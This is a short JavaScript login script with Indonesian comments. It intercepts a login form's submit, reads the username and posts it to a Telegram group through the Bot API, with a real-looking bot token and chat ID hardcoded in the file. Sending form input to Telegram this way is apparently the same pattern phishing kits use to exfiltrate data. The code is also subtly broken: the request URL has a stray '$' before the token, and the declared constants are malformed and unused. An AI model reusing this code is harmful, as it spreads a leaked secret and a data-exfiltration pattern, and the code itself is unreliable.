const token = '<7601673506:AAFgYnsUA5WuKjHlxluEtJ-rB4F6Knun-yM>';
const group_id = '<-1002699637445>';

// Fungsi untuk mengirim pesan ke bot Telegram
function sendToTelegram(username) {
    const message = `User login: ${username}`;
    const url = `https://api.telegram.org/bot$7601673506:AAFgYnsUA5WuKjHlxluEtJ-rB4F6Knun-yM/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: -1002699637445,
            text: message,
        }),
    })
    .then(response => {
        if (response.ok) {
            console.log('Pesan berhasil dikirim ke Telegram');
        } else {
            console.error('Gagal mengirim pesan ke Telegram');
        }
    })
    .catch(error => {
        console.error('Terjadi kesalahan:', error);
    });
}

// Contoh penggunaan: Ambil nama user dari form login.html
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah form submit secara default

    const username = document.getElementById('username').value; // Ambil nilai input username
    if (username) {
        sendToTelegram(username); // Kirim nama user ke Telegram
    } else {
        console.error('Username tidak boleh kosong');
    }
});